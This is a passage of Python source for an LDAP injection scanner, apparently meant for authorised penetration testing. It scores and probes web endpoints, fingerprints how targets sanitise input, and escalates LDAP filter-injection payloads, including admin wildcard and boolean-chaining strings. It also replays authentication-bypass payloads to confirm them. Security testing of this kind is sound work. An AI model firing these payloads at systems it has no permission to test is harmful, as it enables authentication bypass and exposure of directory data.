  body{{font-family:'Courier New',monospace;background:#0d0d0d;color:#e0e0e0;padding:24px}}
  h1{{color:#0af;font-size:1.6em;margin-bottom:4px}}
  h2{{color:#0cf;font-size:1.1em;margin:24px 0 10px;border-bottom:1px solid #333;padding-bottom:4px}}
  table{{width:100%;border-collapse:collapse}}
  th{{background:#1a1a1a;color:#aaa;text-align:left;padding:6px 10px;font-size:0.8em}}
  td{{padding:5px 10px;border-bottom:1px solid #222;font-size:0.82em;vertical-align:top}}
  code{{font-family:inherit;word-break:break-all}}
  pre{{white-space:pre-wrap;word-break:break-all}}
  .stat{{display:inline-block;background:#1a1a1a;border:1px solid #333;border-radius:4px;
         padding:10px 20px;margin:6px;text-align:center;min-width:110px}}
  .stat-n{{font-size:2em;font-weight:bold}}
  .stat-l{{font-size:0.75em;color:#aaa;margin-top:2px}}
</style>
</head>
<body>
<h1>🔍 LDAPi Detection Report v{VERSION}</h1>
<div style="color:#555;margin-bottom:20px">
  Target: <span style="color:#0af">{tgt}</span> &nbsp;|&nbsp;
  Scan ID: <span style="color:#555">{h(handoff.scan_id)}</span> &nbsp;|&nbsp;
  {h(ts)}
</div>

<h2>Executive Summary</h2>
<div>
  <div class="stat"><div class="stat-n" style="color:#ff2c2c">{conf}</div><div class="stat-l">Confirmed</div></div>
  <div class="stat"><div class="stat-n" style="color:#ff8c00">{prob}</div><div class="stat-l">Probable</div></div>
  <div class="stat"><div class="stat-n" style="color:#ffd700">{crits}</div><div class="stat-l">Critical</div></div>
  <div class="stat"><div class="stat-n" style="color:#ff8c00">{highs}</div><div class="stat-l">High</div></div>
  <div class="stat"><div class="stat-n" style="color:#6fa8dc">{raw_c}</div><div class="stat-l">Direct LDAP</div></div>
  <div class="stat"><div class="stat-n" style="color:#0f0">{handoff.endpoints_scanned}</div><div class="stat-l">Scanned</div></div>
  <div class="stat"><div class="stat-n" style="color:#aaa">{handoff.total_requests}</div><div class="stat-l">Requests</div></div>
</div>

<table style="margin-top:16px;max-width:600px">
  <tr><td style="color:#aaa">WAF</td><td>{waf_str}</td></tr>
  <tr><td style="color:#aaa">LDAP Server</td><td style="color:#eee">{h(handoff.ldap_server_type)}</td></tr>
  <tr><td style="color:#aaa">Framework</td><td style="color:#eee">{h(handoff.framework_detected)}</td></tr>
  <tr><td style="color:#aaa">Budget Mode</td><td style="color:#eee">{h(handoff.budget_mode)}</td></tr>
  <tr><td style="color:#aaa">Duration</td><td style="color:#eee">{round(handoff.duration_seconds,1)}s</td></tr>
</table>

<h2>Findings</h2>
{finding_html or '<p style="color:#0f0">✓ No confirmed LDAP injection findings. Manual review recommended.</p>'}

{('<h2>Direct LDAP Protocol Findings</h2>' + raw_html) if raw_html else ''}

{('<h2>Cross-Endpoint Chains</h2>' + chain_html) if chain_html else ''}

<h2>Execution Trace (last 200 steps)</h2>
<table>
<thead><tr><th>Time</th><th>Phase</th><th>Action</th><th>Detail</th><th>Outcome</th></tr></thead>
<tbody>{trace_rows}</tbody>
</table>

<div style="margin-top:30px;color:#333;font-size:0.75em">
  Generated by {h(TOOL_NAME)} v{VERSION} — Authorised testing only
</div>
</body>
</html>"""
        return html

# ═══════════════════════════════════════════════════════════════════════════════
# §V10-EL  EXTERNAL ENDPOINT LOADER — Ported from HELLHOUND CMDinj v5.5
# ═══════════════════════════════════════════════════════════════════════════════

_STATIC_EXT_LOADER = re.compile(
    r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|"
    r"pdf|zip|webp|bmp|tiff|avif|mp4|mp3|ogg|wav|avi|mov)$", re.I)
_MEDIA_PATH_LOADER = re.compile(
    r"^/(?:img|image|images|avatar|avatars|media|thumb|thumbnails|"
    r"upload|uploads|cdn|files|public|res|resources|favicon|icons|"
    r"photo|photos|static|assets|fonts|dist|covers|banner|banners|"
    r"sprite|sprites|poster|posters|preview|previews)/", re.I)


# ═══════════════════════════════════════════════════════════════════════════════
# §V12-ATM  ADAPTIVE TARGET MODEL — Phase 1 learning + multi-signal LDAP scoring
# ═══════════════════════════════════════════════════════════════════════════════

class AdaptiveTargetModel:
    """
    V12 Phase 1 — Replaces static parameter heuristics with a dynamic model
    that learns from every probe response and accumulates multi-signal evidence.

    Signals tracked:
      - Response patterns suggesting LDAP error messages or directory data
      - Session state changes (auth cookies appearing/disappearing)
      - Timing deltas for probe vs. benign on the landing page
      - Stack fingerprint (AD-specific headers, error classes)
      - Incremental score decay for endpoints that consistently reject all probes
    """

    # Token-level semantic signal weights (used instead of hard param-name list)
    _SEMANTIC_WEIGHTS: Dict[str, float] = {
        "user":       3.0, "uid":        3.0, "login":      3.0,
        "account":    2.5, "principal":  2.5, "sam":        2.5,
        "credential": 2.5, "password":   2.0, "pass":       2.0,
        "search":     2.0, "query":      2.0, "filter":     2.0,
        "ldap":       3.5, "directory":  2.5, "dn":         2.5,
        "cn":         2.0, "ou":         2.0, "dc":         2.0,
        "member":     1.5, "group":      1.5, "role":       1.5,
        "email":      1.5, "mail":       1.5, "name":       1.0,
        "id":         1.0, "token":      1.5, "session":    1.0,
    }

    # Stack evidence → LDAP backend likelihood boost
    _STACK_SIGNALS: Dict[str, float] = {
        "Active-Directory":         20.0, "NTLM":               18.0,
        "Kerberos":                 18.0, "WWW-Authenticate":   10.0,
        "X-Powered-By: JBoss":     12.0, "X-Powered-By: PHP":   6.0,
        "javax.naming":             25.0, "com.sun.jndi":        25.0,
        "OpenLDAP":                 22.0, "389 Directory":       22.0,
        "DSID-":                    30.0, "LdapErr":             30.0,
    }

    def __init__(self):
        self._lock            = threading.Lock()
        # Endpoint key → accumulated LDAP probability score
        self._ep_scores:      Dict[str, float]        = defaultdict(float)
        # Endpoint key → per-param semantic score
        self._param_scores:   Dict[str, Dict[str,float]] = defaultdict(dict)
        # Endpoint key → observation history
        self._observations:   Dict[str, List[str]]    = defaultdict(list)
        # Global stack evidence accumulated during phase 0/1
        self._stack_evidence: List[str]               = []
        # Session baseline: set of cookie names before any probe
        self._session_baseline: Set[str]              = set()
        # Incremental decay: endpoints that consistently reject get deprioritized
        self._reject_counts:  Dict[str, int]          = defaultdict(int)

    # ── Semantic parameter scoring ────────────────────────────────────────────

    def score_param_name(self, name: str) -> float:
        """Score a parameter name using token-level semantic weights."""
        nl = name.lower()
        score = 0.0
        for token, w in self._SEMANTIC_WEIGHTS.items():
            if token in nl:
                score += w
        return min(score, 10.0)

    def score_params(self, params: List[str]) -> Dict[str, float]:
        """Return per-param semantic scores."""
        return {p: self.score_param_name(p) for p in params}

    # ── Response-driven learning ──────────────────────────────────────────────

    def observe_response(self, ep_key: str, resp_text: str,
                          resp_headers: Dict[str, str],
                          resp_status: int,
                          cookies_before: Set[str],
                          cookies_after:  Set[str]) -> None:
        """
        Observe a probe response and update the LDAP probability for this endpoint.
        Called after every probe — not just on anomalies.
        """
        boost = 0.0
        obs:  List[str] = []

        # Stack-level signal detection in body + headers
        body_sample = resp_text[:2000].lower()
        for sig, w in self._STACK_SIGNALS.items():
            if sig.lower() in body_sample:
                boost += w
                obs.append(f"body:{sig}")
            for hv in resp_headers.values():
                if sig.lower() in hv.lower():
                    boost += w * 0.5
                    obs.append(f"header:{sig}")

        # Session state change (new cookie → possible auth context)
        new_cookies = cookies_after - cookies_before
        if new_cookies:
            boost += 8.0
            obs.append(f"new_session_cookies:{new_cookies}")

        # Error code indicating backend processing
        if resp_status in (500, 501, 502):
            boost += 5.0
            obs.append(f"server_error:{resp_status}")
        elif resp_status == 403:
            # Might be WAF-filtered LDAP path — slight boost
            boost += 2.0
            obs.append("403_filter")

        with self._lock:
            self._ep_scores[ep_key] = min(
                self._ep_scores[ep_key] + boost, 100.0)
            if obs:
                self._observations[ep_key].extend(obs)

    def observe_rejection(self, ep_key: str) -> None:
        """Mark that this endpoint cleanly rejected a probe (no anomaly)."""
        with self._lock:
            self._reject_counts[ep_key] += 1
            # Decay: after 3 clean rejections, cut probability in half
            if self._reject_counts[ep_key] % 3 == 0:
                self._ep_scores[ep_key] *= 0.5

    def observe_stack(self, evidence: List[str]) -> None:
        """Feed global stack signals from Phase 0/1 into the model."""
        with self._lock:
            self._stack_evidence.extend(evidence)

    # ── Score accessors ───────────────────────────────────────────────────────

    def get_ep_score(self, ep_key: str) -> float:
        with self._lock:
            return self._ep_scores.get(ep_key, 0.0)

    def get_observations(self, ep_key: str) -> List[str]:
        with self._lock:
            return list(self._observations.get(ep_key, []))

    def boost_ep(self, ep_key: str, amount: float) -> None:
        with self._lock:
            self._ep_scores[ep_key] = min(
                self._ep_scores.get(ep_key, 0.0) + amount, 100.0)

    def prioritized_endpoints(
        self, eps: List["Endpoint"]
    ) -> List["Endpoint"]:
        """Re-rank endpoints using accumulated model scores."""
        def _model_score(ep: "Endpoint") -> float:
            base = self.get_ep_score(ep.key)
            # Add semantic param scores
            for p in ep.params:
                base += self.score_param_name(p) * 2
            # Boost auth endpoints
            if ep.is_auth_ep:
                base += 15
            return base

        return sorted(eps, key=_model_score, reverse=True)


# ═══════════════════════════════════════════════════════════════════════════════
# §V12-FDD  FEEDBACK-DRIVEN DISCOVERY — Phase 2 adaptive endpoint scoring
# ═══════════════════════════════════════════════════════════════════════════════

class FeedbackDrivenDiscovery:
    """
    V12 Phase 2 — Scores and re-ranks discovered endpoints using live feedback.

    Algorithm:
      1. Probe each endpoint with a benign request — observe input reflection,
         state changes, or LDAP-suggestive response patterns.
      2. Compute a FeedbackScore combining: reflection_score, state_score,
         timing_score, error_score.
      3. Re-rank endpoints so high-score ones get injection priority.
      4. Flag endpoints showing input reflection for parameter expansion.
    """

    @dataclass
    class FeedbackScore:
        ep_key:          str
        reflection:      bool   = False   # target reflects param input in response
        state_change:    bool   = False   # new session cookie appeared
        timing_spike:    bool   = False   # response took >2× baseline
        error_signal:    bool   = False   # 5xx or LDAP error in body
        total:           float  = 0.0

    def __init__(self, client: "HTTPClient", cfg: "ScanConfig",
                 budget: "AdaptiveBudgetManager"):
        self._client = client
        self._cfg    = cfg
        self._budget = budget
        self._lock   = threading.Lock()
        self._scores: Dict[str, "FeedbackDrivenDiscovery.FeedbackScore"] = {}

    def probe_endpoint(
        self, ep: "Endpoint", model: "AdaptiveTargetModel"
    ) -> "FeedbackDrivenDiscovery.FeedbackScore":
        """Probe one endpoint and update AdaptiveTargetModel."""
        score = self.FeedbackScore(ep_key=ep.key)

        if not self._budget.acquire_for_phase("tier0"):
            return score

        # Use a benign but distinctive probe value so we can detect reflection
        probe_val = f"ldapiprobe_{ep.key[:6]}"
        data = {p: (probe_val if i == 0 else safe_val(p))
                for i, p in enumerate(ep.params[:3])}

        before_cookies: Set[str] = set(self._client._session.cookies.keys())
        t0 = time.monotonic()

        resp = self._client.send_endpoint(ep, data, phase="tier0")
        if resp is None:
            model.observe_rejection(ep.key)
            return score

        elapsed = time.monotonic() - t0
        after_cookies: Set[str] = set(resp.cookies.keys()) | set(
            self._client._session.cookies.keys())

        body = resp.text or ""

        # Input reflection detection
        if probe_val in body:
            score.reflection = True
            score.total      += 15.0

        # Session state change
        new_c = after_cookies - before_cookies
        if new_c:
            score.state_change = True
            score.total        += 10.0

        # Timing spike — compare against 2× the timeout-baseline proxy
        if elapsed > (self._cfg.timeout * 0.3):
            score.timing_spike = True
            score.total        += 8.0

        # Error signal in body
        if resp.status_code >= 500 or LDAP_ERRORS_RE.search(body):
            score.error_signal = True
            score.total        += 12.0

        # Feed into model
        model.observe_response(
            ep_key        = ep.key,
            resp_text     = body,
            resp_headers  = dict(resp.headers),
            resp_status   = resp.status_code,
            cookies_before= before_cookies,
            cookies_after = after_cookies,
        )

        with self._lock:
            self._scores[ep.key] = score
        return score

    def rerank(
        self, eps: List["Endpoint"], model: "AdaptiveTargetModel"
    ) -> List["Endpoint"]:
        """
        Re-rank endpoints merging FeedbackScore + AdaptiveTargetModel score.
        Runs probes in a thread pool (respects budget).
        """
        with ThreadPoolExecutor(
            max_workers=min(self._cfg.threads, 6),
            thread_name_prefix="fdd"
        ) as pool:
            futs = {pool.submit(self.probe_endpoint, ep, model): ep
                    for ep in eps[:30]}   # probe top-30 only
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception:
                    pass

        def _combined(ep: "Endpoint") -> float:
            fb = self._scores.get(ep.key)
            fb_score = fb.total if fb else 0.0
            return ep.ldap_prob + fb_score + model.get_ep_score(ep.key)

        reranked = sorted(eps, key=_combined, reverse=True)
        expanded = self._expand_reflecting(reranked)
        return expanded

    def _expand_reflecting(
        self, eps: List["Endpoint"]
    ) -> List["Endpoint"]:
        """
        For endpoints where input is reflected, add common LDAP-relevant
        parameter names if not already present (context-aware expansion).
        """
        _EXPAND_PARAMS = ["search", "query", "filter", "username",
                          "uid", "cn", "member", "dn", "sAMAccountName"]
        for ep in eps:
            fb = self._scores.get(ep.key)
            if fb and fb.reflection and len(ep.params) < 8:
                for p in _EXPAND_PARAMS:
                    if p not in ep.params:
                        ep.params.append(p)
        return eps


# ═══════════════════════════════════════════════════════════════════════════════
# §V12-DPR  DYNAMIC PAYLOAD REFINER — Phase 3 adaptive payload complexity
# ═══════════════════════════════════════════════════════════════════════════════

class DynamicPayloadRefiner:
    """
    V12 Phase 3 — When a probe triggers a partial anomaly (not full confirm),
    escalate payload complexity iteratively:
      Level 0: wildcard probes (*)
      Level 1: simple filter manipulation (*(objectClass=*))
      Level 2: boolean chaining (*(|(uid=*)(uid=admin)))
      Level 3: nested OR conditions (*(|(cn=*)(|(ou=*)(dc=*))))
      Level 4: complex blind extraction filters

    Also tracks timing deviation per escalation level.
    """

    _LEVELS: List[List[str]] = [
        # Level 0 — minimal
        ["*", "**"],
        # Level 1 — basic filter
        ["*(objectClass=*)", "*(|(objectClass=person))", ")(cn=*"],
        # Level 2 — boolean chaining
        ["*(|(uid=*)(uid=admin))", "admin*)(%26(|", "*(|(cn=*)(|(uid=*)))"],
        # Level 3 — nested OR
        ["*(|(cn=*)(|(ou=*)(dc=*)))", "*(|(objectClass=person)(|(uid=*)(cn=*)))"],
        # Level 4 — blind extraction
        ["*(cn=" + chr(ord('a') + i) + "*)" for i in range(3)],
    ]

    def __init__(self, client: "HTTPClient", pipeline: "DetectionPipeline",
                 budget: "AdaptiveBudgetManager", cfg: "ScanConfig"):
        self._client   = client
        self._pipeline = pipeline
        self._budget   = budget
        self._cfg      = cfg

    def refine(
        self, ep: "Endpoint", param: str,
        baseline: "Baseline",
        partial_result: "DetectionResult",
    ) -> Tuple[Optional["Payload"], Optional["DetectionResult"]]:
        """
        Escalate payload complexity starting from the level that triggered
        partial_result.score. Returns the first escalation that produces
        a full signal, or None.
        """
        # Choose start level based on partial score
        if partial_result.score < 2.0:
            start = 1
        elif partial_result.score < 4.0:
            start = 2
        else:
            start = 3

        for level in range(start, len(self._LEVELS)):
            for raw in self._LEVELS[level]:
                if not self._budget.acquire_injection():
                    return None, None

                pl = Payload(
                    raw       = raw,
                    desc      = f"dpr_level{level}",
                    technique = f"adaptive_l{level}",
                    tier      = PayloadTier.TIER1_CORE,
                    priority  = 8 - level,
                )
                data = build_injection_data(
                    ep, param, raw, self._cfg.deterministic_suffix)
                resp = self._client.send_endpoint(ep, data, phase="injection")
                if resp is None:
                    continue

                t0 = time.monotonic()
                result = self._pipeline.run(resp, baseline, pl)
                elapsed = time.monotonic() - t0

                # Timing spike at this level is itself a signal
                if elapsed > baseline.median_time * 2.0 and not result.fired:
                    result = DetectionResult(
                        fired    = True,
                        score    = 3.5,
                        signals  = [DetectionSignal(
                            detector  = "TimingRefiner",
                            score     = 3.5,
                            indicator = f"level{level}_timing_spike",
                            evidence  = f"elapsed={elapsed:.3f}s baseline={baseline.median_time:.3f}s",
                        )],
                        severity = Severity.MEDIUM,
                        evidence = f"timing_spike @level{level}",
                    )

                if result.fired and result.score >= 3.0:
                    vprint(f"  [DPR] Level {level} escalation confirmed: {raw[:40]!r}")
                    return pl, result

        return None, None


# ═══════════════════════════════════════════════════════════════════════════════
# §V12-TPE  TARGET PROFILER ENGINE — Phase 4 pre-injection characterization
# ═══════════════════════════════════════════════════════════════════════════════

class TargetProfilerEngine:
    """
    V12 Phase 4 — Before escalating injection complexity, profiles the target:
      - Input reflection: does param value appear in response?
      - Error verbosity: does it leak stack traces or LDAP error codes?
      - Sanitization level: are special chars stripped or escaped?
      - Session sensitivity: does auth state change on injection?

    Produces a TargetProfile that governs Phase 4 escalation strategy:
      LENIENT  → escalate fast, use aggressive payloads
      MODERATE → standard escalation
      HARDENED → slow, stealthy, evasive payloads first
    """

    @dataclass
    class TargetProfile:
        reflects_input:    bool  = False
        leaks_errors:      bool  = False
        strips_specials:   bool  = False
        sanitizes_parens:  bool  = False
        session_sensitive: bool  = False
        strategy:          str   = "MODERATE"   # LENIENT|MODERATE|HARDENED
        special_chars_safe: List[str] = field(default_factory=list)

    _PROBE_SPECIALS = ["*", "(", ")", "\\", "\x00", "&", "|"]

    def __init__(self, client: "HTTPClient", pipeline: "DetectionPipeline",
                 cfg: "ScanConfig"):
        self._client   = client
        self._pipeline = pipeline
        self._cfg      = cfg
        self._cache:   Dict[str, "TargetProfilerEngine.TargetProfile"] = {}

    def profile(
        self, ep: "Endpoint", param: str, baseline: "Baseline"
    ) -> "TargetProfilerEngine.TargetProfile":
        """Profile a single endpoint+param. Cached per endpoint key."""
        if ep.key in self._cache:
            return self._cache[ep.key]

        profile = self.TargetProfile()

        # ── Probe 1: Input reflection ─────────────────────────────────────────
        marker  = f"ldapi_probe_{uuid.uuid4().hex[:6]}"
        data    = build_injection_data(ep, param, marker, self._cfg.deterministic_suffix)
        resp    = self._client.send_endpoint(ep, data, phase="tier0")
        if resp and marker in (resp.text or ""):
            profile.reflects_input = True

        # ── Probe 2: Error verbosity ──────────────────────────────────────────
        err_data = build_injection_data(ep, param,
                                        ")(invalid_filter_test", self._cfg.deterministic_suffix)
        resp2    = self._client.send_endpoint(ep, err_data, phase="tier0")
        if resp2 and (LDAP_ERRORS_RE.search(resp2.text or "")
                      or resp2.status_code == 500):
            profile.leaks_errors = True

        # ── Probe 3: Special char sanitization ───────────────────────────────
        safe_chars: List[str] = []
        for ch in self._PROBE_SPECIALS:
            dat  = build_injection_data(ep, param, ch, self._cfg.deterministic_suffix)
            resp3 = self._client.send_endpoint(ep, dat, phase="tier0")
            if resp3 and ch in (resp3.text or ""):
                safe_chars.append(ch)  # char was NOT stripped
        profile.special_chars_safe = safe_chars
        profile.strips_specials    = len(safe_chars) < 3
        profile.sanitizes_parens   = "(" not in safe_chars and ")" not in safe_chars

        # ── Probe 4: Session sensitivity ─────────────────────────────────────
        before  = set(self._client._session.cookies.keys())
        inj_dat = build_injection_data(ep, param, "*", self._cfg.deterministic_suffix)
        resp4   = self._client.send_endpoint(ep, inj_dat, phase="tier0")
        if resp4:
            after = set(resp4.cookies.keys())
            if after - before:
                profile.session_sensitive = True

        # ── Strategy decision ─────────────────────────────────────────────────
        hardened_signals = sum([
            profile.strips_specials,
            profile.sanitizes_parens,
            not profile.leaks_errors,
        ])
        lenient_signals  = sum([
            profile.reflects_input,
            profile.leaks_errors,
            len(safe_chars) >= 4,
        ])

        if lenient_signals >= 2:
            profile.strategy = "LENIENT"
        elif hardened_signals >= 2:
            profile.strategy = "HARDENED"
        else:
            profile.strategy = "MODERATE"

        self._cache[ep.key] = profile
        vprint(f"  [TPE] {ep.url}:{param} → strategy={profile.strategy} "
               f"safe_chars={safe_chars} reflect={profile.reflects_input}")
        return profile

    def strategy_payload_limit(self, profile: "TargetProfilerEngine.TargetProfile") -> int:
        """How many T1 payloads to run based on strategy."""
        return {"LENIENT": 12, "MODERATE": 8, "HARDENED": 5}.get(profile.strategy, 8)


# ═══════════════════════════════════════════════════════════════════════════════
# §V12-EV  EXPLOIT VALIDATOR — Phase 5 reliability confirmation
# ═══════════════════════════════════════════════════════════════════════════════

class ExploitValidator:
    """
    V12 Phase 5 — Before finalizing a CONFIRMED or PROBABLE finding,
    replays the exact payload N times and requires ≥ threshold consistency.
    Also verifies session/auth-state persistence if the finding is a bypass.
    Findings failing validation are downgraded to CANDIDATE.
    """

    _REPLAY_COUNT  = 3      # replays per finding
    _MIN_HITS      = 2      # minimum consistent hits out of replays
    _AUTH_RE       = re.compile(
        r"logged.in|welcome|dashboard|admin|profile|authenticated",
        re.I)

    def __init__(self, client: "HTTPClient", pipeline: "DetectionPipeline",
                 cfg: "ScanConfig", budget: "AdaptiveBudgetManager"):
        self._client   = client
        self._pipeline = pipeline
        self._cfg      = cfg
        self._budget   = budget

    def validate(
        self, f: "HandoffFinding",
        ep: "Endpoint", baseline: "Baseline"
    ) -> Tuple[str, int, List[str]]:
        """
        Replay exploit and return (new_grade, confidence, validation_notes).
        """
        notes: List[str] = []
        hits             = 0

        pl = Payload(
            raw       = f.payload_raw,
            desc      = "exploit_validation_replay",
            technique = f.payload_technique,
            tier      = PayloadTier.TIER1_CORE,
        )

        for attempt in range(self._REPLAY_COUNT):
            if not self._budget.acquire_for_phase("verification"):
                notes.append(f"Budget exhausted at replay #{attempt+1}")
                break

            data = build_injection_data(
                ep, f.parameter_name, f.payload_raw,
                self._cfg.deterministic_suffix)
            resp = self._client.send_endpoint(ep, data, phase="verification")
            if resp is None:
                notes.append(f"Replay #{attempt+1}: no response")
                continue

            result = self._pipeline.run(resp, baseline, pl)
            if result.fired:
                hits += 1
                notes.append(f"Replay #{attempt+1}: CONFIRMED (score={result.score:.1f})")

                # Auth bypass persistence check
                if "bypass" in f.payload_technique.lower() or f.is_auth_ep if hasattr(f, 'is_auth_ep') else False:
                    if self._AUTH_RE.search(resp.text or ""):
                        notes.append(f"Replay #{attempt+1}: auth state persists")
                        hits += 1   # extra credit for auth state
            else:
                notes.append(f"Replay #{attempt+1}: no signal (score={result.score:.1f})")
            time.sleep(0.4)

        consistency = hits / max(self._REPLAY_COUNT, 1)
        confidence  = min(100, f.reproduction_confidence + int(consistency * 30))

        if hits >= self._MIN_HITS:
            grade = f.verification_grade   # keep or upgrade
            notes.append(f"Validation PASSED: {hits}/{self._REPLAY_COUNT} consistent replays")
        elif hits == 1:
            grade = VerificationGrade.PROBABLE.value
            notes.append(f"Validation PARTIAL: downgraded to PROBABLE ({hits}/{self._REPLAY_COUNT})")
        else:
            grade = VerificationGrade.CANDIDATE.value
            confidence = max(confidence - 20, 10)
            notes.append(f"Validation FAILED: downgraded to CANDIDATE ({hits}/{self._REPLAY_COUNT})")

        return grade, confidence, notes


class ExternalEndpointLoader:
    """
    V10 — Ported from HELLHOUND CMDinj _load_crawl_import().

    Accepted formats (same as CMDinj):
      A) Object with 'endpoints' array (preferred Hellhound Spider output):
         { "target": "http://...", "endpoints": [{url, method, params,...}] }

      B) Bare array:
         [ {url, method, params}, ... ]

      C) Flat {label: path/url} dict:
         { "target": "http://...", "login": "/login", "search": "/api/search" }

      D) OpenAPI-lite paths:
         { "paths": { "/login": { "post": { "parameters": [...] } } } }

    Normalization per entry (mirrors CMDinj logic):
      - URL: resolve relative paths against target; skip static assets, media
        paths, 404 entries
      - Method: list or string → single uppercase; PUT/PATCH/DELETE → POST
      - Params: dict (flat or bucketed), list of dicts/strings, query-string,
        body (url-encoded or JSON), response_body JSON key chase
      - Hidden fields: hidden_params dict
      - Source label: Hellhound Spider list → mapped string
      - Dedup: same (norm_url, method) → merge params

    Fatal exit (sys.exit 1) when:
      - File not found
      - JSON parse error
      - No endpoints extracted after normalization
    """

    def __init__(self, cfg: "ScanConfig"):
        self._cfg = cfg

    # ── Public ────────────────────────────────────────────────────────────────

    def load(self) -> List["Endpoint"]:
        """
        Load, normalize and return Endpoint list.
        Fatal sys.exit(1) if file missing, parse error, or zero valid entries.
        Returns empty list only when endpoints_file is None (no --endpoints).
        """
        ep_file = self._cfg.endpoints_file
        if not ep_file:
            return []

        resolved = self._resolve_path(ep_file)
        if resolved is None:
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} --endpoints: file not found: {ep_file!r}")
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} Searched: cwd={os.getcwd()!r}, "
                   f"script={os.path.dirname(os.path.abspath(globals().get("__file__", sys.argv[0])))!r}, "
                   f"output_dir={self._cfg.output_dir!r}")
            sys.exit(1)

        # ── Read + parse ────────────────────────────────────────────────────
        try:
            with open(resolved, encoding="utf-8") as fh:
                raw_text = fh.read().strip()
            if not raw_text:
                tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} --endpoints: file is empty: {resolved}")
                sys.exit(1)
            raw = json.loads(raw_text)
        except json.JSONDecodeError as exc:
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} --endpoints: JSON parse error "
                   f"at line {exc.lineno} col {exc.colno}: {exc.msg}")
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} File: {resolved}")
            sys.exit(1)
        except OSError as exc:
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} --endpoints: cannot open file: {exc}")
            sys.exit(1)

        # ── Determine format + extract raw_entries ──────────────────────────
        target_url: Optional[str] = self._cfg.target
        raw_entries: List[Any]    = []

        if isinstance(raw, list):
            # Format B — bare array
            raw_entries = raw

        elif isinstance(raw, dict):
            target_url = (raw.get("target") or raw.get("base_url")
                          or raw.get("url") or self._cfg.target)
            entries = (raw.get("endpoints") or raw.get("urls")
                       or raw.get("results") or raw.get("items"))

            if entries and isinstance(entries, list):
                # Format A — preferred
                raw_entries = entries

            elif "paths" in raw and isinstance(raw["paths"], dict):
                # Format D — OpenAPI-lite
                for path_str, methods in raw["paths"].items():
                    if not isinstance(methods, dict):
                        continue
                    for method_key, details in methods.items():
                        if method_key.upper() not in ("GET","POST","PUT","PATCH","DELETE","HEAD"):
                            continue
                        params: Dict[str,str] = {}
                        if isinstance(details, dict):
                            for p in details.get("parameters", []):
                                if isinstance(p, dict) and "name" in p:
                                    params[p["name"]] = str(p.get("example","") or "")
                        base = (target_url or "").rstrip("/")
                        raw_entries.append({
                            "url":    base + path_str,
                            "method": method_key.upper(),
                            "params": params,
                            "source": "openapi",
                        })

            else:
                # Format C — flat {label: path} dict
                for _k, _v in raw.items():
                    if _k in ("target","base_url","url","meta","info","version","scan_id"):
                        continue
                    if isinstance(_v, str) and (_v.startswith("/") or _v.startswith("http")):
                        raw_entries.append({"url": _v, "_label": _k})
                    elif isinstance(_v, dict) and "url" in _v:
                        raw_entries.append(_v)

        if not raw_entries:
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} --endpoints: no endpoints found in the JSON file.")
            tprint(f"  {color('[INFO]',  C.BCYAN)} Expected: {{\"endpoints\":[{{\"url\":\"...\",\"method\":\"GET\",...}}]}} or a bare array.")
            sys.exit(1)

        # ── Infer target from first absolute URL if still unknown ───────────
        if not target_url:
            for _e in raw_entries:
                _u = (_e.get("url") or "") if isinstance(_e, dict) else ""
                if _u.startswith("http"):
                    _p = urlparse(_u)
                    target_url = f"{_p.scheme}://{_p.netloc}"
                    break

        # ── Report header ───────────────────────────────────────────────────
        phase_summary_box(
            "EXTERNAL ENDPOINT LOADER  [CMDinj-port]",
            [
                ("File",        resolved),
                ("Size",        f"{os.path.getsize(resolved):,} bytes"),
                ("Entries raw", str(len(raw_entries))),
                ("Target",      target_url or "inferred"),
                ("Mode",        "Direct — skip crawl phase"),
            ],
            col=C.BMAGENTA,
        )

        # ── Normalize each entry ─────────────────────────────────────────────
        normalized: List[Dict[str,Any]] = []
        seen_norm:  Dict[Tuple,int]     = {}

        for _raw_ep in raw_entries:
            result = self._normalize_entry(_raw_ep, target_url)
            if result is None:
                continue
            _url_c, _method, _params, _hidden, _source, _priority, _ldap_prob = result

            # Dedup: same (norm_url, method) → merge params (CMDinj pattern)
            _nk = (self._norm_url(_url_c), _method)
            if _nk in seen_norm:
                _ex = normalized[seen_norm[_nk]]
                for _pk, _pv in _params.items():
                    _ex["params"].setdefault(_pk, _pv)
                for _pk in _priority:
                    if _pk not in _ex["priority_params"]:
                        _ex["priority_params"].append(_pk)
            else:
                seen_norm[_nk] = len(normalized)
                normalized.append({
                    "url":            _url_c,
                    "method":         _method,
                    "params":         _params,
                    "hidden":         _hidden,
                    "source":         _source,
                    "priority_params":_priority,
                    "ldap_prob":      _ldap_prob,
                })

        if not normalized:
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} --endpoints: "
                   f"all {len(raw_entries)} entries were filtered out "
                   f"(404s, static assets, no valid URLs).")
            tprint(f"  {color('[FATAL]', C.BRED+C.BOLD)} "
                   f"Cannot continue without endpoints. Exiting.")
            sys.exit(1)

        # ── Convert to Endpoint objects ─────────────────────────────────────
        eps: List[Endpoint] = []
        for nd in normalized:
            ep = Endpoint(
                url            = nd["url"],
                method         = nd["method"],
                params         = list(nd["params"].keys()),
                source         = nd["source"],
                default_params = nd["params"],
                use_json       = False,
                ldap_prob      = nd["ldap_prob"],
            )
            eps.append(ep)
            vprint(f"[Loader] {nd['method']} {nd['url']}  params={list(nd['params'].keys())[:6]}")

        phase_summary_box(
            "LOADER RESULT",
            [
                ("Raw entries",      len(raw_entries)),
                ("Valid endpoints",  color(str(len(eps)), C.BGREEN+C.BOLD)),
                ("Filtered out",     str(len(raw_entries) - len(normalized))),
                ("Source",           "external-json"),
            ],
            col=C.BMAGENTA,
        )

        return eps

    # ── Private helpers ───────────────────────────────────────────────────────

    def _resolve_path(self, filename: str) -> Optional[str]:
        """Multi-strategy path resolution (V9 logic kept)."""
        for candidate in [
            filename,
            os.path.join(os.getcwd(),  os.path.basename(filename)),
            os.path.join(os.path.dirname(os.path.abspath(globals().get("__file__", sys.argv[0]))), os.path.basename(filename)),
            os.path.join(self._cfg.output_dir, os.path.basename(filename)),
        ]:
            c = os.path.realpath(candidate)
            if os.path.isfile(c):
                return c
        return None

    @staticmethod
    def _norm_url(url: str) -> str:
